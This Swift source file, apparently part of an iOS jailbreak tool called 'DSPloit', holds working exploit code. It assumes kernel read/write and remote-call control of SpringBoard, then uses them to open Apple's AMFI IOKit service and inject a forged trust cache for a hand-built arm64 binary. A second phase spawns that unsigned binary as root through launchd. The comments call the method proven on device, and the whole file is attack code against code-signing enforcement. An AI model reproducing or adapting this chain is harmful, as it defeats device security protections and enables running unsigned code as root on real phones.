//
//  exp_tc_load_and_spawn.swift
//  DSPloit
//
//  PROVEN WORKING: Load TC via SpringBoard IOKit (selector 1)
//  Then test spawn via launchd (separate operation)
//
//  FINDINGS (2026-05-30 on device):
//  - IOServiceOpen to AMFI works from SpringBoard (kr=0x0)
//  - Selector 1 returns SUCCESS (TC loaded!)
//  - BUT doing posix_spawn in same session causes respring
//  - Solution: split into 2 phases with delay between them
//
//  Created by Royan | 2026-05-30
//

import Foundation
import CommonCrypto

final class ExpTCLoadAndSpawn {
    static let shared = ExpTCLoadAndSpawn()
    var onLog: ((String) -> Void)?
    
    private var tcLoaded = false
    private var testBinPath = ""
    
    private func log(_ msg: String) {
        DispatchQueue.main.async { self.onLog?(msg) }
        globallogger.log("(exp_tc_spawn) \(msg)")
    }
    
    // MARK: - Phase 1: Load Trust Cache (via SpringBoard)
    
    func phase1_loadTC() {
        #if !DISABLE_REMOTECALL
        let mgr = dspmgr.shared
        guard mgr.dsready, mgr.rcready, let sb = mgr.sbProc else {
            log("❌ Need KRW + SpringBoard RC"); return
        }
        
        tcLoaded = false
        log("══ Phase 1: Load Trust Cache ══")
        log("")
        
        // Build test binary + trust cache
        let testBin = buildBinary()
        let cdhash = sha256t20(testBin)
        let tcData = buildTrustCacheV2(cdhash: cdhash)
        log("CDHash: \(cdhash.map { String(format: "%02x", $0) }.joined())")
        log("TC: \(tcData.count) bytes (1 entry, constraint=2)")
        
        // Write binary to disk
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
        testBinPath = docs + "/jb_test_bin"
        do {
            try testBin.write(to: URL(fileURLWithPath: testBinPath))
            // chmod via SpringBoard
            let pathStr = remote_alloc_str(sb, testBinPath)
            RootExecutor.rcall(sb, "chmod", pathStr, 0o755)
            RootExecutor.rcall(sb, "free", pathStr)
            log("✅ Binary written + chmod 755")
        } catch {
            log("❌ Write failed: \(error.localizedDescription)"); return
        }
        log("")
        
        // IOKit: Open AMFI service + load TC (MINIMAL calls to avoid respring)
        log("Opening AMFI IOKit...")
        let amfiStr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
        let matching = RootExecutor.rcall(sb, "IOServiceMatching", amfiStr)
        
        guard matching != 0 else {
            log("❌ IOServiceMatching failed"); return
        }
        
        let service = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matching)
        guard service != 0 else {
            log("❌ AMFI service not found"); return
        }
        log("✅ AMFI service: 0x\(String(service, radix: 16))")
        
        // IOServiceOpen
        let connAddr = sb.trojanMem + 0x2800
        sb[connAddr].setValue32(0)
        let kr = RootExecutor.rcall(sb, "IOServiceOpen", service, 0x103, 0, connAddr)
        let conn = sb[connAddr].value32()
        
        guard kr == 0 && conn != 0 else {
            log("❌ IOServiceOpen failed: kr=0x\(String(kr, radix: 16))"); return
        }
        log("✅ Connection: 0x\(String(conn, radix: 16))")
        
        // Write TC to remote memory
        let tcBuf = sb.trojanMem + 0x3000
        tcData.withUnsafeBytes { buf in
            sb.remote_write(tcBuf, from: buf.baseAddress!, size: UInt64(tcData.count))
        }
        
        // Call selector 1 (PROVEN WORKING on device!)
        let outBuf = sb.trojanMem + 0x4000
        let outSizeAddr = sb.trojanMem + 0x4800
        sb[outSizeAddr].setValue64(256)
        
        log("Calling selector 1...")
        let result = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
            UInt64(conn), 1, tcBuf, UInt64(tcData.count), outBuf, outSizeAddr)
        
        if result == 0 {
            log("✅✅✅ TRUST CACHE LOADED! (selector 1)")
            tcLoaded = true
            log("")
            log("TC is now in kernel memory.")
            log("Wait 3 seconds, then tap 'Phase 2: Test Spawn'")
            log("(DO NOT tap immediately — let SpringBoard stabilize)")
        } else {
            log("❌ Selector 1 failed: 0x\(String(result, radix: 16))")
            log("")
            // Try selector 2 as fallback
            sb[outSizeAddr].setValue64(256)
            let r2 = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                UInt64(conn), 2, tcBuf, UInt64(tcData.count), outBuf, outSizeAddr)
            if r2 == 0 {
                log("✅ Selector 2 worked instead!")
                tcLoaded = true
            } else {
                log("Selector 2: 0x\(String(r2, radix: 16))")
            }
        }
        
        // Close connection (cleanup)
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(conn))
        log("")
        log("══ Phase 1 Complete ══")
        
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    // MARK: - Phase 2: Test Spawn (via launchd — separate operation)
    
    func phase2_testSpawn() {
        #if !DISABLE_REMOTECALL
        let mgr = dspmgr.shared
        guard mgr.dsready else {
            log("❌ KRW not active — re-jailbreak first"); return
        }
        
        log("══ Phase 2: Test Unsigned Spawn ══")
        log("")
        
        if !tcLoaded {
            log("⚠️ TC may not be loaded (run Phase 1 first)")
            log("   Trying spawn anyway...")
        }
        
        if testBinPath.isEmpty {
            let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
            testBinPath = docs + "/jb_test_bin"
        }
        
        log("Binary: \(testBinPath)")
        log("Spawning via launchd (uid=0)...")
        log("")
        
        RootExecutor.shared.executeAsRoot(operation: "tc_spawn_test") { rc in
            let mem = rc.trojanMem
            let pathAddr = remote_alloc_str(rc, self.testBinPath)
            
            // Ensure chmod 755
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            
            // posix_spawn
            let pidAddr = mem + 0xA00
            rc[pidAddr].setValue32(0)
            let argv = mem + 0xA10
            rc[argv].setValue64(pathAddr)
            rc[argv + 8].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
            let pid = rc[pidAddr].value32()
            RootExecutor.rcall(rc, "free", pathAddr)
            
            let success = (ret == 0 && pid != 0)
            return (success, "ret=\(ret) pid=\(pid)", UInt64(pid))
        }
        
        // Poll for result
        DispatchQueue.main.asyncAfter(deadline: .now() + 12) { [weak self] in
            guard let self else { return }
            if let result = RootExecutor.shared.lastResult, result.operation == "tc_spawn_test" {
                if result.success {
                    self.log("✅✅✅ UNSIGNED BINARY SPAWNED! PID=\(result.returnValue)")
                    self.log("")
                    self.log("🎉🎉🎉 FULL JAILBREAK ACHIEVED! 🎉🎉🎉")
                    self.log("")
                    self.log("Trust cache loaded + unsigned exec = COMPLETE")
                } else {
                    self.log("❌ Spawn failed: \(result.message)")
                    self.log("")
                    if result.message.contains("ret=1") {
                        self.log("EPERM — AMFI still blocking")
                        self.log("TC may have been unloaded after respring")
                        self.log("Try: Phase 1 → wait 3s → Phase 2 (no respring)")
                    }
                }
            } else {
                self.log("⚠️ Timeout waiting for launchd result")
            }
        }
        
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    // MARK: - Trust Cache v2 Builder (Apple IPSW format)
    
    private func buildTrustCacheV2(cdhash: Data) -> Data {
        var tc = Data()
        var version: UInt32 = 2
        tc.append(Data(bytes: &version, count: 4))
        var uuid = UUID().uuid
        tc.append(Data(bytes: &uuid, count: 16))
        var count: UInt32 = 1
        tc.append(Data(bytes: &count, count: 4))
        // Entry: cdhash[20] + hash_type[1] + flags[1] + constraint[2]
        tc.append(cdhash.prefix(20))
        if cdhash.count < 20 { tc.append(Data(repeating: 0, count: 20 - cdhash.count)) }
        var hashType: UInt8 = 2   // SHA256
        var flags: UInt8 = 0
        var constraint: UInt16 = 2 // normal (from Apple IPSW)
        tc.append(Data(bytes: &hashType, count: 1))
        tc.append(Data(bytes: &flags, count: 1))
        tc.append(Data(bytes: &constraint, count: 2))
        return tc
    }
    
    // MARK: - Minimal arm64 binary: exit(0)
    
    private func buildBinary() -> Data {
        var bin = Data()
        bin.append(contentsOf: [
            0xCF,0xFA,0xED,0xFE, 0x0C,0x00,0x00,0x01,
            0x00,0x00,0x00,0x00, 0x02,0x00,0x00,0x00,
            0x02,0x00,0x00,0x00, 0x60,0x01,0x00,0x00,
            0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
        ])
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0]=0x19; seg[4]=0x48
        seg[8]=0x5F;seg[9]=0x5F;seg[10]=0x54;seg[11]=0x45;seg[12]=0x58;seg[13]=0x54
        seg[28]=0x01; seg[32]=0x00;seg[33]=0x40; seg[40]=0x00;seg[41]=0x40
        seg[48]=0x05; seg[52]=0x05
        bin.append(contentsOf: seg)
        var thr = [UInt8](repeating: 0, count: 280)
        thr[0]=0x05;thr[4]=0x18;thr[5]=0x01;thr[8]=0x06;thr[12]=0x44
        thr[272]=0x80;thr[273]=0x01;thr[276]=0x01
        bin.append(contentsOf: thr)
        while bin.count < 0x180 { bin.append(0) }
        bin.append(contentsOf: [0x00,0x00,0x80,0xD2, 0x30,0x00,0x80,0xD2, 0x01,0x10,0x00,0xD4])
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
    
    private func sha256t20(_ data: Data) -> Data {
        var hash = [UInt8](repeating: 0, count: Int(CC_SHA256_DIGEST_LENGTH))
        data.withUnsafeBytes { CC_SHA256($0.baseAddress, CC_LONG(data.count), &hash) }
        return Data(hash.prefix(20))
    }
}
